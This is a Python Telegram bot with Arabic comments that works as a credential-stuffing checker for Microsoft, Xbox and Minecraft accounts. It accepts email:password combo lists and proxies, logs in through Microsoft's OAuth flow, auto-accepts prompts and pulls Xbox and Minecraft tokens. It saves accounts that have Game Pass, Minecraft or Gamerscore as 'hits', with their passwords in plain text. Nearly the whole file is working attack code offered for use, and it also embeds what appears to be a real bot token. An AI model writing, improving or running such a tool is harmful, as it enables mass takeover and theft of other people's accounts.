import os
import re
import time
import threading
import queue
import random
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# =================== الإعدادات ===================
BOT_TOKEN = os.getenv("8937386411:AAGKAckcO69bj-g9eH38yn2S1anlRYgHTCk")  # ضع التوكن في متغيرات البيئة
if not BOT_TOKEN:
    raise ValueError("يجب تعيين BOT_TOKEN في متغيرات البيئة")

DOWNLOAD_DIR = "downloads"
RESULT_DIR = "XBOX_RESULT"
HATHOUN_DIR = "Hathoun"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(RESULT_DIR, exist_ok=True)
os.makedirs(HATHOUN_DIR, exist_ok=True)

urllib3.disable_warnings()

# =================== المتغيرات العامة ===================
checked = 0
total_combos = 0
hits = 0
bad = 0
twofa = 0
errors = 0
gamepass_count = 0
minecraft_count = 0
gscore_count = 0
start_time = 0
is_running = False
account_counter = 0
account_counter_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()
process_queue = queue.Queue()
active_tasks = {}

gamepass_accounts = []
minecraft_accounts = []
gscore_accounts = []
proxies_list = []
DELAY_BETWEEN_CHECKS = 0.5
REQUEST_TIMEOUT = 25

# =================== دوال الاستخراج (نفس الكود الأصلي) ===================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
        r'value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"',
        r'value=\"([^\"]+)\"[^>]*name=\"PPFT\"',
        r'name=\"PPFT\"[^>]*value=\"([^\"]+)\"',
        r'value="([^"]+)"[^>]*id="i0327"',
        r'"sFTTag":".*?value=\\"([^\\"]+)\\"',
        r'"sFTTag":"<input[^>]*value="([^"]+)"',
        r'<input[^>]*name="PPFT"[^>]*value="([^"]+)"',
        r'<input[^>]*value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT"\s*:\s*"([^"]+)"',
        r'value=\\"([^\\"]+)\\"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'"urlPost":\s*"([^"]+)"',
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
        r'"post_url":"([^"]+)"',
        r'"urlPost":"([^"]+)"',
        r'urlPost:\s*"([^"]+)"',
        r'"loginUrl":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

# =================== دوال الحفظ والملفات ===================
def get_next_file_number(base_name):
    existing_files = os.listdir(RESULT_DIR)
    pattern = re.compile(rf'{re.escape(base_name)}-(\d+)\.txt$')
    max_num = 0
    for file in existing_files:
        match = pattern.match(file)
        if match:
            num = int(match.group(1))
            if num > max_num:
                max_num = num
    return max_num + 1

def extract_email_from_content(content):
    email_match = re.search(r'Email: (.+?)\n', content)
    if email_match:
        return email_match.group(1).strip()
    return None

def remove_duplicates(accounts):
    unique_accounts = {}
    for acc in accounts:
        email = extract_email_from_content(acc['content'])
        if email:
            if email not in unique_accounts:
                unique_accounts[email] = acc
            else:
                if acc['gscore'] > unique_accounts[email]['gscore']:
                    unique_accounts[email] = acc
    return list(unique_accounts.values())

def save_accounts_to_file(accounts, filepath):
    if not accounts:
        return 0
    accounts = remove_duplicates(accounts)
    accounts.sort(key=lambda x: x['gscore'], reverse=True)
    for idx, acc in enumerate(accounts, 1):
        acc['content'] = re.sub(r'Account number: \d+', f'Account number: {idx}', acc['content'])
    with open(filepath, 'w', encoding='utf-8') as f:
        for acc in accounts:
            f.write(acc['content'] + '\n')
    return len(accounts)

def save_hit_immediately(account_type, content, gscore):
    with file_lock:
        if account_type == 'gamepass':
            filename = "XBOX-GamePass.txt"
        elif account_type == 'minecraft':
            filename = "Minecraft-Hits.txt"
        elif account_type == 'gscore':
            filename = "G-Score-Hits.txt"
        else:
            return
        filepath = os.path.join(RESULT_DIR, filename)
        existing = []
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                raw = f.read()
                parts = raw.split('_________________________________________________________')
                for p in parts:
                    if p.strip():
                        gs = re.search(r'Gamerscore: (\d+)', p)
                        if gs:
                            existing.append({'content': p.strip(), 'gscore': int(gs.group(1))})
        existing.append({'content': content, 'gscore': gscore})
        save_accounts_to_file(existing, filepath)

# =================== دالة الفحص الأساسية ===================
def check_account(combo, task_id):
    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter

    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock:
            bad += 1
            checked += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()

    proxy = None
    if proxies_list:
        proxy_str = random.choice(proxies_list)
        proxy_parts = proxy_str.strip().split(':')
        if len(proxy_parts) == 4:
            ip, port, user, pwd = proxy_parts
            proxy = f"http://{user}:{pwd}@{ip}:{port}"
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy = f"http://{ip}:{port}"

    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)

    for attempt in range(3):
        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}

        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
        })

        try:
            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
            text = resp.text

            sftag = extract_ppft(text)
            url_post = extract_url_post(text)

            if not sftag or not url_post:
                with stats_lock:
                    bad += 1
                    checked += 1
                session.close()
                return

            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
                'i19': '0',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': sftag_url,
                'Origin': 'https://login.live.com',
            }
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)

            ms_token = None
            login_text = login_req.text.lower()
            login_url = login_req.url.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif 'access_token' in login_text:
                token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
                if token_match:
                    ms_token = token_match.group(1)
            elif 'window.location.replace' in login_text:
                loc_match = re.search(r'window\.location\.replace\(["\']([^"\']+)["\']\)', login_text)
                if loc_match:
                    redirect_url = loc_match.group(1)
                    if 'access_token' in redirect_url:
                        ms_token = parse_qs(urlparse(redirect_url).fragment).get('access_token', [None])[0]
            elif 'location.href' in login_text:
                loc_match = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', login_text)
                if loc_match:
                    redirect_url = loc_match.group(1)
                    if 'access_token' in redirect_url:
                        ms_token = parse_qs(urlparse(redirect_url).fragment).get('access_token', [None])[0]
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect", "account or password is incorrect", "sign in to your microsoft account"]):
                with stats_lock:
                    bad += 1
                    checked += 1
                session.close()
                return
            elif any(x in login_text for x in ["recover", "account.live.com/identity/confirm", "email/confirm", "abuse", "locked", "help us protect", "verify your identity", "security challenge", "two-step", "additional security"]):
                with stats_lock:
                    twofa += 1
                    checked += 1
                session.close()
                return
            elif 'cancel?mkt=' in login_text or 'kmsi' in login_text or 'id="idBtn_Back"' in login_text or 'stay signed in' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text)
                    if not action_match:
                        action_match = re.search(r'action="([^"]+)"', login_req.text)
                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {
                            'ipt': ipt_match.group(1),
                            'pprid': pprid_match.group(1),
                            'uaid': uaid_match.group(1),
                            'LoginOptions': '3',
                            'type': '11',
                        }
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        if 'access_token' in ret.url:
                            ms_token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                        else:
                            return_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
                            if return_url:
                                fin = session.get(return_url.group(1), allow_redirects=True, timeout=REQUEST_TIMEOUT)
                                if 'access_token' in fin.url:
                                    ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except:
                    pass
            elif 'terms of use' in login_text or ('accept' in login_text and 'terms' in login_text):
                try:
                    action = re.search(r'<form[^>]*action="([^"]+)"', login_req.text)
                    if action:
                        form_data = {}
                        for m in re.finditer(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', login_req.text):
                            form_data[m.group(1)] = m.group(2)
                        form_data['iAccpet'] = '1'
                        terms_resp = session.post(action.group(1), data=form_data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        if 'access_token' in terms_resp.url:
                            ms_token = parse_qs(urlparse(terms_resp.url).fragment).get('access_token', [None])[0]
                except:
                    pass

            if not ms_token:
                with stats_lock:
                    bad += 1
                    checked += 1
                session.close()
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)

            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamertag = "N/A"
            gamerscore = "0"
            gscore_int = 0

            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': 
                                gamerscore = s['value']
                                try:
                                    gscore_int = int(gamerscore)
                                except:
                                    gscore_int = 0
            except:
                pass

            has_gp = False
            has_mc = False
            gp_type = ""
            mc_ent_text = ""

            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
                                           headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                            if ent_req.status_code == 200:
                                mc_ent_text = ent_req.text
            except:
                pass

            if 'product_game_pass_ultimate' in mc_ent_text:
                gp_type = "Game Pass Ultimate"
                has_gp = True
            elif 'product_game_pass_pc' in mc_ent_text:
                gp_type = "PC Game Pass"
                has_gp = True
            elif 'product_game_pass_console' in mc_ent_text:
                gp_type = "Xbox Game Pass Console"
                has_gp = True

            has_mc = 'product_minecraft' in mc_ent_text

            with account_counter_lock:
                account_counter += 1
                current_num = account_counter

            hit_content = f"""Account number: {current_num}
Email: {email}
Password: {password}
Gamertag: {gamertag}
Gamerscore: {gamerscore}
Minecraft: {'Yes' if has_mc else 'No'}
Game Pass: {gp_type if has_gp else 'No'}
_________________________________________________________"""

            with stats_lock:
                if has_gp:
                    gamepass_count += 1
                    hits += 1
                    save_hit_immediately('gamepass', hit_content, gscore_int)
                elif has_mc:
                    minecraft_count += 1
                    hits += 1
                    save_hit_immediately('minecraft', hit_content, gscore_int)
                elif gscore_int > 0:
                    gscore_count += 1
                    hits += 1
                    save_hit_immediately('gscore', hit_content, gscore_int)
                else:
                    bad += 1
                checked += 1

            time.sleep(DELAY_BETWEEN_CHECKS)
            return 

        except:
            time.sleep(0.5)
        finally:
            if session:
                session.close()

    with stats_lock:
        errors += 1
        checked += 1

# =================== دوال البوت ===================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *XBOX/Minecraft Checker Bot*\n\n"
        "أرسل ملف `combo.txt` (بصيغة `email:password`) لبدء الفحص.\n"
        "يمكنك إرسال ملف بروكسيات اختياري (`proxy.txt`) بصيغة `ip:port` أو `ip:port:user:pass`.\n"
        "استخدم الأمر `/status` لمعرفة التقدم.\n"
        "استخدم `/stop` لإيقاف المهمة الحالية.\n\n"
        "سيتم إعادة النتائج كملفات نصية مباشرة.",
        parse_mode="Markdown"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checked, total_combos, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, start_time, is_running
    if not is_running:
        await update.message.reply_text("❌ لا توجد مهمة قيد التشغيل حاليًا.")
        return
    elapsed = int(time.time() - start_time) if start_time else 0
    cpm = int((checked / elapsed) * 60) if elapsed > 2 else 0
    msg = (
        f"📊 *التقدم:* {checked}/{total_combos} ({ (checked/total_combos)*100:.1f}%)\n"
        f"⏱️ الوقت: {elapsed} ثانية\n"
        f"⚡ CPM: {cpm}\n"
        f"✅ *Hits:* {hits}\n"
        f"🎮 Game Pass: {gamepass_count}\n"
        f"⛏️ Minecraft: {minecraft_count}\n"
        f"🏆 G-Score: {gscore_count}\n"
        f"❌ Bad: {bad}\n"
        f"🔐 2FA: {twofa}\n"
        f"⚠️ Errors: {errors}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running
    if not is_running:
        await update.message.reply_text("❌ لا توجد مهمة لإيقافها.")
        return
    is_running = False
    await update.message.reply_text("⏹️ تم طلب الإيقاف. ستنتهي المهمة بعد الفحص الحالي.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxies_list, is_running, total_combos, checked, start_time, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter
    document = update.message.document
    if not document:
        return

    file_name = document.file_name or ""
    if not file_name.endswith('.txt'):
        await update.message.reply_text("❌ يرجى إرسال ملف نصي `.txt` فقط.")
        return

    if is_running:
        await update.message.reply_text("⚠️ مهمة قيد التشغيل بالفعل. استخدم `/stop` أولاً.")
        return

    file = await document.get_file()
    file_path = os.path.join(DOWNLOAD_DIR, file_name)
    await file.download_to_drive(file_path)

    if "proxy" in file_name.lower():
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        await update.message.reply_text(f"✅ تم تحميل {len(proxies_list)} بروكسي.")
        return

    if "combo" not in file_name.lower():
        await update.message.reply_text("⚠️ يُفترض أن الملف هو `combo.txt`. سيتم التعامل معه كقائمة توكنات.")

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    if not combos:
        await update.message.reply_text("❌ الملف فارغ أو لا يحتوي على توكنات صالحة (صيغة `email:password`).")
        return

    total_combos = len(combos)
    checked = 0
    hits = bad = twofa = errors = 0
    gamepass_count = minecraft_count = gscore_count = 0
    account_counter = 0
    start_time = time.time()
    is_running = True

    await update.message.reply_text(f"🚀 بدء الفحص على {total_combos} حساب باستخدام {len(proxies_list) or 'بدون'} بروكسي.")

    threading.Thread(target=run_checker, args=(combos, update.message.chat_id, context), daemon=True).start()

def run_checker(combos, chat_id, context):
    global is_running
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = []
            for combo in combos:
                if not is_running:
                    break
                futures.append(executor.submit(check_account, combo, "bot_task"))
            for f in futures:
                if not is_running:
                    break
                f.result()
    except Exception as e:
        context.bot.send_message(chat_id, f"⚠️ خطأ: {str(e)}")
    finally:
        is_running = False
        send_results(chat_id, context)

def send_results(chat_id, context):
    global hits, gamepass_count, minecraft_count, gscore_count
    files_sent = []
    for fname in ["XBOX-GamePass.txt", "Minecraft-Hits.txt", "G-Score-Hits.txt"]:
        fpath = os.path.join(RESULT_DIR, fname)
        if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            try:
                with open(fpath, 'rb') as f:
                    context.bot.send_document(chat_id, document=f, filename=fname)
                files_sent.append(fname)
            except:
                pass
    if not files_sent:
        context.bot.send_message(chat_id, "❌ لم يتم العثور على أي نتائج (Hits = 0).")
    else:
        context.bot.send_message(
            chat_id,
            f"✅ تم الانتهاء من الفحص.\n"
            f"📦 نتائج: {', '.join(files_sent)}\n"
            f"🎯 إجمالي الضربات: {hits}\n"
            f"🎮 Game Pass: {gamepass_count}\n"
            f"⛏️ Minecraft: {minecraft_count}\n"
            f"🏆 G-Score: {gscore_count}"
        )

# =================== تشغيل البوت ===================
if __name__ == "__main__":
    import concurrent.futures
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("🤖 البوت يعمل...")
    app.run_polling()
